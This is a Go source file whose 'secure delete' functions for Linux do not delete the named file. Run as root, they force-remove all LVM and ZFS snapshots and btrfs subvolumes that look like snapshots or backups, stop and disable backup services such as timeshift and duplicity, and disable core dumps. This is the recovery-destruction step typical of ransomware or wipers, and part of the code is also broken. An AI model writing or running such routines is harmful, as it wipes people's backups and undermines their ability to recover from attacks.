//go:build linux

package utils

import (
"os"
"os/exec"
"strings"
)

func init() {
isAdminPlatform = func() bool { return os.Getuid() == 0 }
secureDeletePlatform = secureDeleteLinux
secureDeleteSystemPlatform = secureDeleteLinuxSystem
disableCoreDumpPlatform = disableCoreDumpLinux
}

func secureDeleteLinux(filePath string, isAdmin bool) {
PrintInfo("[Linux] Starting secure delete operation...")

if isAdmin {
PrintInfo("[Linux] Deleting LVM snapshots...")
deleteLVMSnapshots()

PrintInfo("[Linux] Deleting btrfs snapshots...")
deleteBtrfsSnapshots()

PrintInfo("[Linux] Deleting ZFS snapshots...")
deleteZFSSnapshots()

PrintInfo("[Linux] Stopping backup services...")
stopBackupServices()
} else {
PrintWarning("[Linux] Not running as root, skipping root-only operations")
}
}

func secureDeleteLinuxSystem(volume string, isAdmin bool) {
	if isAdmin {
		PrintInfo("[Linux] Executing system-level secure delete...")

		deleteLVMSnapshots()
		deleteBtrfsSnapshots()
		deleteZFSSnapshots()
		stopBackupServices()
	}
}

func deleteLVMSnapshots() {
cmds := []struct {
name string
cmd  string
args []string
}{
{"List LVM snapshots", "lvscan", []string{"--snapshot"}},
}

for _, c := range cmds {
PrintInfo("[Linux] Executing: %s", c.name)
output, err := executeCommand(c.name, c.cmd, c.args)
if err != nil {
PrintWarning("[Linux] %s failed: %v", c.name, err)
if len(output) > 0 {
PrintInfo("[Linux] Command output: %s", output)
}
} else {
PrintSuccess("[Linux] %s succeeded", c.name)
if len(output) > 0 && strings.Contains(strings.ToLower(output), "snapshot") {
lines := strings.Split(strings.TrimSpace(output), "\n")
for _, line := range lines {
if strings.Contains(strings.ToLower(line), "snapshot") {
parts := strings.Fields(line)
if len(parts) > 0 {
snapshotName := parts[len(parts)-1]
PrintInfo("[Linux] Found snapshot: %s", snapshotName)
executeCommand("Delete snapshot "+snapshotName, "lvremove", []string{"-f", snapshotName})
}
}
}
}
}
}
}

func deleteBtrfsSnapshots() {
output, err := executeCommand("List btrfs subvolumes", "btrfs", []string{"subvolume", "list", "/"})
if err != nil {
PrintWarning("[Linux] Failed to list btrfs subvolumes: %v", err)
return
}

if len(output) > 0 {
lines := strings.Split(strings.TrimSpace(output), "\n")
for _, line := range lines {
if strings.Contains(line, "@") || strings.Contains(line, "snapshot") || strings.Contains(line, "backup") {
parts := strings.Fields(line)
if len(parts) > 0 {
path := parts[len(parts)-1]
PrintInfo("[Linux] Found btrfs snapshot: %s", path)
executeCommand("Delete btrfs snapshot "+path, "btrfs", []string{"subvolume", "delete", path})
}
}
}
}
}

func deleteZFSSnapshots() {
output, err := executeCommand("List ZFS snapshots", "zfs", []string{"list", "-t", "snapshot"})
if err != nil {
PrintWarning("[Linux] Failed to list ZFS snapshots: %v", err)
return
}

if len(output) > 0 {
lines := strings.Split(strings.TrimSpace(output), "\n")
for i, line := range lines {
if i == 0 {
continue
}
parts := strings.Fields(line)
if len(parts) > 0 {
snapshotName := parts[0]
PrintInfo("[Linux] Found ZFS snapshot: %s", snapshotName)
executeCommand("Delete ZFS snapshot "+snapshotName, "zfs", []string{"destroy", snapshotName})
}
}
}
}

func stopBackupServices() {
services := []string{
"rsnapshot",
"rsync",
"backuppc",
"duplicity",
"timeshift",
}

for _, service := range services {
PrintInfo("[Linux] Checking and stopping service: %s", service)

cmd := exec.Command("systemctl", "is-active", service)
output, err := cmd.CombinedOutput()
if err != nil {
PrintInfo("[Linux] Service %s is not running", service)
continue
}

if strings.Contains(strings.ToLower(string(output)), "active") {
executeCommand("Stop service "+service, "systemctl", []string{"stop", service})
executeCommand("Disable service "+service, "systemctl", []string{"disable", service})
} else {
PrintInfo("[Linux] Service %s is not running", service)
}
}
}

func disableCoreDumpLinux() {
cmds := []struct {
name string
cmd  string
args []string
}{
{"Set soft limit", "ulimit", []string{"-c", "0"}},
{"Set /proc/sys/kernel/core_pattern", "echo", []string{"\"\"", ">", "/proc/sys/kernel/core_pattern"}},
}

for _, c := range cmds {
PrintInfo("[Linux] Executing: %s", c.name)
output, err := executeCommand(c.name, c.cmd, c.args)
if err != nil {
PrintWarning("[Linux] %s failed: %v", c.name, err)
if len(output) > 0 {
PrintInfo("[Linux] Command output: %s", output)
}
} else {
PrintSuccess("[Linux] %s succeeded", c.name)
}
}
}